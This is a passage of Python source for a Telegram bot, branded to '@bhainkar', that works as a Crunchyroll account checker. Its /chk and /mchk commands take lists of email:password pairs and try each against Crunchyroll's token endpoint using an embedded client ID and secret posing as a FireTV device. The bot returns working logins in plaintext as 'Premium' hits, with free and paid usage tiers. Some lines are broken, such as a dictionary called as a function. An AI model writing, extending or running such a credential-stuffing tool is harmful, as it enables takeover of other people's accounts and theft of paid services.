    except (ValueError, IndexError):
        # Catch errors in the command format and notify the user
        bot.send_message(message.chat.id, "Usᴇ /chk email:pass Tᴏ Sᴛᴀʀᴛ Cʜᴇᴄᴋɪɴɢ", disable_web_page_preview=True)

# Helper function to check if the account format is valid
def check_account_format(email, pasw):
    # Check for the basic structure of email and password
    if "@" in email and len(pasw) > 0:
        return True
    return False

@bot.message_handler(commands=['mchk'])
@anti_spam
def mchk(message):
    user_id = str(message.from_user.id)

    try:
        accounts = message.text.split()[1:]
        if not accounts:
            bot.send_message(message.chat.id, "Usᴇ /mchk email:pass\n𝗡𝗢𝗧𝗘: Fʀᴇᴇ ᴜsᴇʀ ᴄᴀɴ ᴄʜᴇᴄᴋ ᴏɴʟʏ 3 ᴀᴄᴄ ᴀᴛ ᴀ ᴛɪᴍᴇ", disable_web_page_preview=True)
            return

        if len(data["accounts"]) > data["mchk_max_free"] and not is_authorized(user_id):
            bot.send_message(message.chat.id, f"Fʀᴇᴇ Usᴇʀs Cᴀɴ Cʜᴇᴄᴋ Uᴘ ᴛᴏ {mchk_max_free} Aᴄᴄᴏᴜɴᴛs Aᴛ A Tɪᴍᴇ.", disable_web_page_preview=True)
            return

        bot.send_message(message.chat.id, "Pʀᴏᴄᴇssɪɴɢ Mᴜʟᴛɪᴘʟᴇ Aᴄᴄᴏᴜɴᴛs...")

        for account in accounts:
            if ":" not in account:
                bot.send_message(message.chat.id, f"Iɴᴠᴀʟɪᴅ Fᴏʀᴍᴀᴛ: {account}", disable_web_page_preview=True)
                continue

            email, pasw = account.split(':')
            result = check_crunchyroll_account(email, pasw, message)
            bot.send_message(message.chat.id, result, parse_mode='HTML', disable_web_page_preview=True)

        # Ensure user limits are initialized if not already present
        if user_id not in data["user_limits"]:
          data["user_limits"][user_id] = {'count': 0}

        # Increment the user's usage count if they are not authorized
        if not is_authorized(user_id):
           data["user_limits"][user_id]['count'] += len(data["accounts"]())

    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "Usᴇ /mchk email:pass [email:pass] (up to 3 for free users)", disable_web_page_preview=True)


# Check Crunchyroll account logic (you can replace this with your API check logic)
def check_crunchyroll_account(email, pasw, message):
    headers = {
        "ETP-Anonymous-ID": str(uuid1()),
        "Request-Type": "SignIn",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": "Ktor client",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {
        "grant_type": "password",
        "username": email,
        "password": pasw,
        "scope": "offline_access",
        "client_id": "yhukoj8on9w2pcpgjkn_",
        "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
        "device_type": "FIRETV",
        "device_id": str(uuid1()),
        "device_name": "kara"
    }

    try:
        res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, headers=headers)

        if "refresh_token" in res.text:
            token = res.json().get('access_token')
            headers_get = {
                "Authorization": f"Bearer {token}",
                "Accept": "application/json",
                "Accept-Charset": "UTF-8",
                "User-Agent": "Ktor client",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }

            res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers_get)

            if "external_id" in res_get.text:
                # Get the user's first name and username to create a clickable profile link
                first_name = message.from_user.first_name
                username = message.from_user.username
                user_id = message.from_user.id

                # Create a clickable link to the user's profile
                plan_type = "Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ" if is_authorized(user_id) else "Fʀᴇᴇ Pʟᴀɴ"
                if username:
                    profile_link = f'<a href="https://t.me/{username}">{first_name}</a>'
                else:
                    profile_link = f'<a href="tg://user?id={user_id}">{first_name}</a>'

                return (f"<b>Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ Pʀᴇᴍɪᴜᴍ</b>\n\n<b>Eᴍᴀɪʟ</b> ✉️: <code>{email}</code>\n<b>Pᴀssᴡᴏʀᴅ</b> 🔑: <code>{pasw}</code>\n\n<b><i>Cʜᴇᴄᴋᴇᴅ ʙʏ</i></b> {profile_link}\n<b><i>Pʟᴀɴ: {plan_type}</i></b>\n<b>Bᴏᴛ ʙʏ</b> @bhainkar")
        elif "Pᴀssᴡᴏʀᴅ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ" in res.text:
            return f"<blockquote expandable>❌ 𝗕𝗔𝗗: {email}:{pasw}</blockquote>"
        elif "Tᴏᴏ ᴍᴀɴʏ ᴀᴛᴛᴇᴍᴘᴛs" in res.text:
            return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Tᴏᴏ ᴍᴀɴʏ ᴀᴛᴛᴇᴍᴘᴛs. Tʀʏ ʟᴀᴛᴇʀ.</blockquote>"
        else:
            return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Uɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ.</blockquote>"
    except requests.exceptions.RequestException as e:
        return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Fᴀɪʟᴇᴅ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ.</blockquote>"

@bot.message_handler(commands=['details'])
def details(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    
    plan_type = "Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ" if is_authorized(user_id) else "Fʀᴇᴇ Pʟᴀɴ"
    chat_id = message.chat.id
    gif_url = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNWt0YWZyaHRrbG5xNzN4MTlkOWZmeDRyZ2ZjcmlwMjhlcnE1azVlNiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/2FHr56vo08zbq8ac0C/giphy.gif"
    bot.send_animation(chat_id, gif_url, caption=f"𝗬𝗼𝘂𝗿 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n<b>Username:</b> @{username}\n<b>Chat ID:</b> <code>{user_id}</code>\n<b>Plan:</b> {plan_type}\n\n<b>Bᴏᴛ ʙʏ</b> @bhainkar", parse_mode="HTML",)
        
if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://.onrender.com/" + bot.token)  # Replace with your server URL
    app.run(host="0.0.0.0", port=5000)  # You can change the port number if needed
      
